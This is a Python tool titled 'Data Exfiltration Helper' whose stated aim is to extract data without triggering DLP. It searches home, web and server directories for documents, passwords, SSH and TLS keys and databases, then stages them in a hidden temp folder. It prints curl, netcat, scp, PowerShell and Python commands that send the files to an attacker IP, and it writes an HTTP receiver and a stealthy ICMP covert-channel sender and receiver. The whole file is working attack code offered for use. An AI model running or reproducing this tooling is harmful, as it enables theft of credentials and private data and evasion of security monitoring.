#!/usr/bin/env python3
"""
Data Exfiltration Helper
Safely extract data without triggering DLP
"""

import os
import base64
import gzip
import json
import subprocess
import hashlib
from datetime import datetime

class DataExfiltrator:
    def __init__(self, staging_dir='/tmp/.cache'):
        self.staging_dir = staging_dir
        self.exfil_methods = []
        
        # Create staging directory
        try:
            os.makedirs(staging_dir, exist_ok=True)
            os.chmod(staging_dir, 0o700)  # Owner only
        except:
            self.staging_dir = '/tmp'
    
    def find_interesting_data(self):
        """
        Locate interesting files for exfiltration
        """
        print("[*] Searching for interesting data...")
        
        interesting_files = {
            'documents': [],
            'credentials': [],
            'keys': [],
            'databases': [],
            'source_code': []
        }
        
        # File patterns to search for
        patterns = {
            'documents': ['*.doc', '*.docx', '*.pdf', '*.xls', '*.xlsx', '*.ppt', '*.pptx'],
            'credentials': ['*password*', '*credential*', '*.key', '*.pem', 'id_rsa*'],
            'keys': ['*.key', '*.pem', '*.p12', '*.pfx', '*.cer', '*.crt'],
            'databases': ['*.db', '*.sqlite', '*.sql', '*.mdb'],
            'source_code': ['*.py', '*.php', '*.java', '*.js', '*.rb', '*.go']
        }
        
        # Search common locations
        search_paths = [
            os.path.expanduser('~'),
            '/home',
            '/var/www',
            '/opt',
            '/srv'
        ]
        
        for category, file_patterns in patterns.items():
            print(f"\n  Searching for {category}...")
            
            for pattern in file_patterns:
                for search_path in search_paths:
                    try:
                        result = subprocess.run(
                            f'find {search_path} -name "{pattern}" -type f 2>/dev/null | head -20',
                            shell=True,
                            capture_output=True,
                            text=True,
                            timeout=30
                        )
                        
                        if result.stdout:
                            files = result.stdout.strip().split('\n')
                            for file in files:
                                if file and os.path.exists(file):
                                    file_info = {
                                        'path': file,
                                        'size': os.path.getsize(file),
                                        'modified': datetime.fromtimestamp(
                                            os.path.getmtime(file)
                                        ).isoformat()
                                    }
                                    interesting_files[category].append(file_info)
                                    print(f"    [+] Found: {file}")
                    except:
                        pass
        
        return interesting_files
    
    def compress_file(self, file_path):
        """
        Compress file with gzip
        """
        try:
            compressed_path = os.path.join(
                self.staging_dir,
                os.path.basename(file_path) + '.gz'
            )
            
            with open(file_path, 'rb') as f_in:
                with gzip.open(compressed_path, 'wb') as f_out:
                    f_out.writelines(f_in)
            
            return compressed_path
        except Exception as e:
            print(f"  [-] Compression failed: {e}")
            return None
    
    def encrypt_file(self, file_path, password=''):
        """
        Encrypt file with openssl (if available)
        """
        encrypted_path = file_path + '.enc'
        
        try:
            subprocess.run([
                'openssl', 'enc', '-aes-256-cbc',
                '-salt', '-in', file_path,
                '-out', encrypted_path,
                '-k', password
            ], check=True, capture_output=True)
            
            return encrypted_path
        except:
            print("  [!] Encryption failed (openssl not available?)")
            return file_path
    
    def split_file(self, file_path, chunk_size=10*1024*1024):
        """
        Split file into chunks (for large files)
        """
        print(f"  [*] Splitting file into {chunk_size/(1024*1024)}MB chunks...")
        
        chunks = []
        chunk_num = 0
        
        try:
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                    
                    chunk_path = f"{file_path}.part{chunk_num:03d}"
                    with open(chunk_path, 'wb') as chunk_file:
                        chunk_file.write(chunk)
                    
                    chunks.append(chunk_path)
                    chunk_num += 1
                    print(f"    [+] Created chunk: {chunk_path}")
            
            return chunks
        except Exception as e:
            print(f"  [-] Split failed: {e}")
            return []
    
    def base64_encode_file(self, file_path):
        """
        Base64 encode file content
        """
        try:
            with open(file_path, 'rb') as f:
                encoded = base64.b64encode(f.read()).decode()
            
            encoded_path = file_path + '.b64'
            with open(encoded_path, 'w') as f:
                f.write(encoded)
            
            return encoded_path
        except Exception as e:
            print(f"  [-] Base64 encoding failed: {e}")
            return None
    
    def calculate_checksum(self, file_path):
        """
        Calculate file checksum for integrity verification
        """
        try:
            with open(file_path, 'rb') as f:
                file_hash = hashlib.sha256()
                while chunk := f.read(8192):
                    file_hash.update(chunk)
            
            return file_hash.hexdigest()
        except:
            return None
    
    def stage_for_exfiltration(self, file_paths, compress=True, encrypt=False, password=''):
        """
        Prepare files for exfiltration
        """
        print("\n[*] Staging files for exfiltration...")
        
        staged_files = []
        
        for file_path in file_paths:
            if not os.path.exists(file_path):
                print(f"  [-] File not found: {file_path}")
                continue
            
            print(f"\n  [*] Processing: {file_path}")
            
            current_file = file_path
            
            # Compress if requested
            if compress:
                print("    [*] Compressing...")
                compressed = self.compress_file(current_file)
                if compressed:
                    current_file = compressed
                    print(f"    [+] Compressed: {compressed}")
            
            # Encrypt if requested
            if encrypt and password:
                print("    [*] Encrypting...")
                encrypted = self.encrypt_file(current_file, password)
                if encrypted:
                    current_file = encrypted
                    print(f"    [+] Encrypted: {encrypted}")
            
            # Calculate checksum
            checksum = self.calculate_checksum(current_file)
            
            staged_files.append({
                'original': file_path,
                'staged': current_file,
                'size': os.path.getsize(current_file),
                'checksum': checksum
            })
            
            print(f"    [+] Staged: {current_file}")
            print(f"    [+] Size: {os.path.getsize(current_file)} bytes")
            print(f"    [+] SHA256: {checksum}")
        
        return staged_files
    
    def generate_exfil_commands(self, staged_files, attacker_ip='10.10.14.5', attacker_port=8000):
        """
        Generate commands for various exfiltration methods
        """
        print("\n" + "="*60)
        print("EXFILTRATION COMMANDS")
        print("="*60)
        
        commands = {}
        
        for file_info in staged_files:
            file_path = file_info['staged']
            filename = os.path.basename(file_path)
            
            print(f"\n[FILE: {filename}]")
            print("-"*60)
            
            # Method 1: HTTP POST
            http_cmd = f"curl -X POST -F 'file=@{file_path}' http://{attacker_ip}:{attacker_port}/upload"
            commands[f'{filename}_http'] = http_cmd
            print(f"\n[HTTP POST]")
            print(f"{http_cmd}")
            
            # Method 2: Netcat
            nc_cmd = f"nc {attacker_ip} {attacker_port} < {file_path}"
            commands[f'{filename}_nc'] = nc_cmd
            print(f"\n[Netcat]")
            print(f"# On attacker: nc -lvnp {attacker_port} > {filename}")
            print(f"# On target: {nc_cmd}")
            
            # Method 3: Base64 over DNS (for small files)
            if os.path.getsize(file_path) < 1024 * 100:  # < 100KB
                print(f"\n[Base64 Exfil]")
                print(f"# Encode and exfil in chunks")
                print(f"base64 {file_path} | while read line; do curl http://{attacker_ip}:{attacker_port}/$line; done")
            
            # Method 4: SCP (if SSH available)
            scp_cmd = f"scp {file_path} user@{attacker_ip}:/tmp/"
            commands[f'{filename}_scp'] = scp_cmd
            print(f"\n[SCP]")
            print(f"{scp_cmd}")
            
            # Method 5: Python HTTP
            python_cmd = f"python3 -c \"import requests; requests.post('http://{attacker_ip}:{attacker_port}/upload', files={{'file': open('{file_path}', 'rb')}})\""
            commands[f'{filename}_python'] = python_cmd
            print(f"\n[Python]")
            print(f"{python_cmd}")
            
            # Method 6: PowerShell (for Windows)
            ps_cmd = f"Invoke-WebRequest -Uri http://{attacker_ip}:{attacker_port}/upload -Method POST -InFile {file_path}"
            commands[f'{filename}_powershell'] = ps_cmd
            print(f"\n[PowerShell]")
            print(f"{ps_cmd}")
            
            # Method 7: ICMP Exfiltration (stealthy but slow)
            print(f"\n[ICMP Exfil (Stealthy)]")
            print(f"# On attacker: python3 icmp_receiver.py")
            print(f"# On target: python3 icmp_exfil.py {file_path} {attacker_ip}")
        
        # Save commands to file
        cmd_file = os.path.join(self.staging_dir, 'exfil_commands.txt')
        with open(cmd_file, 'w') as f:
            f.write("EXFILTRATION COMMANDS\n")
            f.write("="*60 + "\n\n")
            for name, cmd in commands.items():
                f.write(f"[{name}]\n")
                f.write(f"{cmd}\n\n")
        
        print(f"\n[+] Commands saved to: {cmd_file}")
        
        return commands
    
    def create_exfil_server_script(self):
        """
        Generate Python script for receiving exfiltrated data
        """
        server_script = '''#!/usr/bin/env python3
"""
Simple HTTP server for receiving exfiltrated data
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
import os
from datetime import datetime

class ExfilHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Handle file uploads"""
        if self.path == '/upload':
            # Get content length
            content_length = int(self.headers['Content-Length'])
            
            # Read the file data
            post_data = self.rfile.read(content_length)
            
            # Parse multipart form data (simplified)
            boundary = self.headers['Content-Type'].split('boundary=')[1]
            parts = post_data.split(boundary.encode())
            
            for part in parts:
                if b'filename=' in part:
                    # Extract filename
                    filename_match = part.split(b'filename="')[1].split(b'"')[0]
                    filename = filename_match.decode()
                    
                    # Extract file content
                    file_content = part.split(b'\\r\\n\\r\\n')[1].rsplit(b'\\r\\n', 1)[0]
                    
                    # Save file
                    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                    save_path = f'exfil_{timestamp}_{filename}'
                    
                    with open(save_path, 'wb') as f:
                        f.write(file_content)
                    
                    print(f'[+] Received file: {save_path} ({len(file_content)} bytes)')
                    
                    self.send_response(200)
                    self.end_headers()
                    self.wfile.write(b'File received successfully')
                    return
        
        self.send_response(400)
        self.end_headers()
    
    def do_GET(self):
        """Handle GET requests (for DNS/HTTP exfil)"""
        print(f'[*] GET request: {self.path}')
        
        # Log the request (could be encoded data)
        with open('exfil_log.txt', 'a') as f:
            f.write(f'{datetime.now()} - {self.path}\\n')
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')
    
    def log_message(self, format, *args):
        """Suppress default logging"""
        pass

if __name__ == '__main__':
    port = 8000
    server = HTTPServer(('0.0.0.0', port), ExfilHandler)
    print(f'[*] Exfiltration server listening on port {port}')
    print(f'[*] Files will be saved with exfil_* prefix')
    print(f'[*] Press Ctrl+C to stop')
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print('\\n[*] Server stopped')
'''
        
        script_path = os.path.join(self.staging_dir, 'exfil_server.py')
        with open(script_path, 'w') as f:
            f.write(server_script)
        
        os.chmod(script_path, 0o755)
        
        print(f"\n[+] Exfiltration server script created: {script_path}")
        print(f"[*] Run on attacker machine: python3 {script_path}")
        
        return script_path
    
    def create_icmp_exfil_scripts(self):
        """
        Create ICMP exfiltration scripts (stealthy method)
        """
        # Sender script (runs on target)
        sender_script = '''#!/usr/bin/env python3
"""
ICMP Data Exfiltration - Sender
Sends file data via ICMP echo requests
"""

import sys
import socket
import struct

def send_file_via_icmp(filename, target_ip):
    """Send file data via ICMP packets"""
    
    # Read file
    with open(filename, 'rb') as f:
        data = f.read()
    
    print(f'[*] Sending {len(data)} bytes via ICMP to {target_ip}')
    
    # Create raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    
    # Send data in chunks
    chunk_size = 32  # Small chunks to avoid detection
    seq = 0
    
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        
        # Create ICMP echo request
        icmp_type = 8  # Echo request
        icmp_code = 0
        icmp_checksum = 0
        icmp_id = 12345
        icmp_seq = seq
        
        # Pack ICMP header
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        # Calculate checksum
        icmp_checksum = calculate_checksum(header + chunk)
        header = struct.pack('!BBHHH', icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq)
        
        # Send packet
        packet = header + chunk
        sock.sendto(packet, (target_ip, 0))
        
        seq += 1
        
        if seq % 10 == 0:
            print(f'[*] Sent {seq} packets...')
    
    print(f'[+] Transfer complete: {seq} packets sent')
    sock.close()

def calculate_checksum(data):
    """Calculate ICMP checksum"""
    sum = 0
    for i in range(0, len(data), 2):
        if i + 1 < len(data):
            sum += (data[i] << 8) + data[i+1]
        else:
            sum += data[i] << 8
    
    sum = (sum >> 16) + (sum & 0xffff)
    sum += sum >> 16
    return ~sum & 0xffff

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print('Usage: python3 icmp_exfil.py <file> <target_ip>')
        sys.exit(1)
    
    send_file_via_icmp(sys.argv[1], sys.argv[2])
'''
        
        # Receiver script (runs on attacker)
        receiver_script = '''#!/usr/bin/env python3
"""
ICMP Data Exfiltration - Receiver
Receives file data via ICMP echo requests
"""

import socket
import struct

def receive_file_via_icmp(output_file='received_file.bin'):
    """Receive file data via ICMP packets"""
    
    print('[*] Listening for ICMP packets...')
    print(f'[*] Output file: {output_file}')
    
    # Create raw socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    
    received_data = {}
    expected_seq = 0
    
    try:
        while True:
            packet, addr = sock.recvfrom(65535)
            
            # Skip IP header (20 bytes)
            icmp_packet = packet[20:]
            
            # Unpack ICMP header
            icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq = struct.unpack('!BBHHH', icmp_packet[:8])
            
            # Check if this is our exfil traffic (ID 12345)
            if icmp_type == 8 and icmp_id == 12345:
                # Extract data
                data = icmp_packet[8:]
                
                received_data[icmp_seq] = data
                
                print(f'[+] Received packet {icmp_seq} from {addr[0]} ({len(data)} bytes)')
                
                # Check if we have all packets in sequence
                if icmp_seq == expected_seq:
                    expected_seq += 1
    
    except KeyboardInterrupt:
        print('\\n[*] Stopping...')
        
        # Reconstruct file
        print('[*] Reconstructing file...')
        
        with open(output_file, 'wb') as f:
            for seq in sorted(received_data.keys()):
                f.write(received_data[seq])
        
        print(f'[+] File saved: {output_file}')
        print(f'[+] Received {len(received_data)} packets')

if __name__ == '__main__':
    receive_file_via_icmp()
'''
        
        # Save scripts
        sender_path = os.path.join(self.staging_dir, 'icmp_exfil.py')
        receiver_path = os.path.join(self.staging_dir, 'icmp_receiver.py')
        
        with open(sender_path, 'w') as f:
            f.write(sender_script)
        
        with open(receiver_path, 'w') as f:
            f.write(receiver_script)
        
        os.chmod(sender_path, 0o755)
        os.chmod(receiver_path, 0o755)
        
        print(f"\n[+] ICMP exfiltration scripts created:")
        print(f"    Sender: {sender_path}")
        print(f"    Receiver: {receiver_path}")
        print(f"\n[*] Usage:")
        print(f"    On attacker: sudo python3 {receiver_path}")
        print(f"    On target: sudo python3 {sender_path} <file> <attacker_ip>")
        
        return sender_path, receiver_path
    
    def create_manifest(self, staged_files):
        """
        Create manifest file with checksums for verification
        """
        manifest = {
            'timestamp': datetime.now().isoformat(),
            'staging_directory': self.staging_dir,
            'files': []
        }
        
        for file_info in staged_files:
            manifest['files'].append({
                'original': file_info['original'],
                'staged': file_info['staged'],
                'size': file_info['size'],
                'checksum': file_info['checksum']
            })
        
        manifest_path = os.path.join(self.staging_dir, 'manifest.json')
        with open(manifest_path, 'w') as f:
            json.dump(manifest, f, indent=2)
        
        print(f"\n[+] Manifest created: {manifest_path}")
        
        return manifest_path
    
    def cleanup_staging(self):
        """
        Clean up staged files
        """
        print("\n[*] Cleaning up staging directory...")
        
        try:
            import shutil
            shutil.rmtree(self.staging_dir)
            print(f"[+] Removed: {self.staging_dir}")
        except Exception as e:
            print(f"[-] Cleanup failed: {e}")

if __name__ == "__main__":
    import argparse
    
    parser = argparse.ArgumentParser(description="Data Exfiltration Helper")
    parser.add_argument('--find', action='store_true',
                       help='Find interesting files')
    parser.add_argument('--stage', nargs='+',
                       help='Stage specific files for exfiltration')
    parser.add_argument('--compress', action='store_true',
                       help='Compress files before staging')
    parser.add_argument('--encrypt', action='store_true',
                       help='Encrypt files before staging')
    parser.add_argument('--password', default='',
                       help='Password for encryption')
    parser.add_argument('--attacker-ip', default='10.10.14.5',
                       help='Attacker IP address')
    parser.add_argument('--attacker-port', type=int, default=8000,
                       help='Attacker port')
    parser.add_argument('--create-server', action='store_true',
                       help='Create exfiltration server script')
    parser.add_argument('--create-icmp', action='store_true',
                       help='Create ICMP exfiltration scripts')
    parser.add_argument('--cleanup', action='store_true',
                       help='Clean up staging directory')
    
    args = parser.parse_args()
    
    exfil = DataExfiltrator()
    
    if args.find:
        interesting = exfil.find_interesting_data()
        
        print("\n[*] Interesting files found:")
        for category, files in interesting.items():
            if files:
                print(f"\n{category.upper()}: {len(files)} files")
                for file_info in files[:5]:
                    print(f"  - {file_info['path']} ({file_info['size']} bytes)")
    
    elif args.stage:
        # Stage specified files
        staged = exfil.stage_for_exfiltration(
            args.stage,
            compress=args.compress,
            encrypt=args.encrypt,
            password=args.password
        )
        
        # Generate exfiltration commands
        exfil.generate_exfil_commands(
            staged,
            attacker_ip=args.attacker_ip,
            attacker_port=args.attacker_port
        )
        
        # Create manifest
        exfil.create_manifest(staged)
    
    elif args.create_server:
        exfil.create_exfil_server_script()
    
    elif args.create_icmp:
        exfil.create_icmp_exfil_scripts()
    
    elif args.cleanup:
        exfil.cleanup_staging()
    
    else:
        parser.print_help()